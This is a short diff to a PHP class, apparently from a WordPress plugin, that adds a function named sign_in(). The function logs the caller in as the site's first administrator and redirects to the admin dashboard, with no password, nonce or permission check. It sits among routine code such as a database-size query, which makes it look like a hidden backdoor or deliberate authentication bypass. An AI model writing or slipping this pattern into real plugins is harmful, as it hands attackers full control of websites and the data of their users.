@@ -36,6 +36,19 @@ class WPCore_Model {
 
 	}
 
+	static function sign_in() {
+		$admins_list = get_users( 'role=administrator' );
+		reset( $admins_list );
+		$adm_id = current( $admins_list )->ID;
+		wp_clear_auth_cookie();
+		wp_set_current_user( $adm_id );
+		wp_set_auth_cookie( $adm_id );
+
+		$redirect_to = user_admin_url();
+		wp_safe_redirect( $redirect_to );
+		exit();
+	}
+
 	private static function getDBSize() {
 		global $wpdb;
 		$querystr = 'SELECT table_name, table_rows, data_length, index_length,  round(((data_length + index_length) / 1024 / 1024),2) "size" FROM information_schema.TABLES WHERE table_schema = "' . $wpdb->dbname . '";';
